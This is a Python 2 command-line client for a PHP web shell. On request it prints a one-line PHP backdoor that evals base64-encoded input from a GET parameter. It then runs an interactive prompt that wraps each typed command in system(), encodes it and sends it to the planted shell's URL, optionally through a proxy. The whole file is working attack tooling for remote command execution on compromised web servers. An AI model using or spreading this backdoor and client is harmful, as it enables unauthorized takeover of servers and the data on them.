#!/usr/bin/env python 
# -*- coding: utf-8 -*- 

from cmd import Cmd
import sys
import base64
import httplib
from urlparse import urlparse
from urllib import quote_plus
from optparse import OptionParser


http_headers = {
               "Content-Type": "application/x-www-form-urlencoded"
               }

optionsp = OptionParser()
optionsp.add_option("-u", "--url", type="string", dest="url", help="Shell url")
optionsp.add_option("-p", "--proxy", type="string",
                    dest="proxy", help="Proxy server")
optionsp.add_option("-s", action="store_true", help="Print the php shell")
(options, args) = optionsp.parse_args(sys.argv)

shell_url = options.url
proxy = options.proxy


class rshell(Cmd):

    pwd = ""
    old_pwd = ""

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def do_help(self, line):
        print "Write the command to send to server shell"

    def default(self, line):
        #This is the default command method
        #system function is called with the command to execute
        s = "system('{0}');".format(line)
        #building url
        url = self.shell_url + '?param='
        #adding base64 encoded parameter
        #the [:-1] is because encodestring add a \n at the end
        url += quote_plus(base64.encodestring(s)[:-1])
        #doing the request to the server
        self.dorequest(url)

    def do_quit(self, line):
        exit(0)

    def do_exit(self, line):
        exit(0)

    def dorequest(self, fullurl):
        parsed_url = urlparse(fullurl)
        url = ''
        con = None
        if self.proxy:
            (ip, port) = self.proxy.split(':')
            con = httplib.HTTPConnection(ip, int(port))
            url = fullurl
        else:
            url = parsed_url.path + '?' + parsed_url.query
            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
        if con:
            con.request('GET', url)
            response = con.getresponse()
            if response.status == 200:
                print response.read()
            else:
                print response.status
        else:
            print "Can't connect"

    def print_payload(self):
        print "<?php eval(base64_decode($_GET['param'])); ?>"


def main():
    a = rshell(shell_url, proxy)
    a.prompt = 'rshell:~ '
    if options.s:
        a.print_payload()
    else:
        a.cmdloop()

if __name__ == '__main__':
    main()
